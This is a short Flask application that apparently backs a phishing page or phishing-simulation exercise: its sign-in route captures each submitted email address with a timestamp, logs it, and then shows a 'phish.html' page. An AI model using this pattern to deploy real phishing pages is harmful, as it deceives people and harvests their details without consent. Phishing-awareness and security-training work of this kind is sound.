from flask import Flask, request, render_template
import logger
# Flask constructor
app = Flask(__name__)

from datetime import datetime


# A decorator used to tell the application
# which URL is associated function
@app.route('/', methods=['GET', 'POST'])
def index():
    return render_template('index.html')
@app.route("/signin", methods = ['POST'])
def signin():
    email = request.form['email']
    time = datetime.now()
    time = time.strftime("%m/%d/%Y, %H:%M:%S")
    logger.log(email, time)


    return render_template('phish.html') #potentially add another webpage here



if __name__ == '__main__':
    app.run(debug=True)
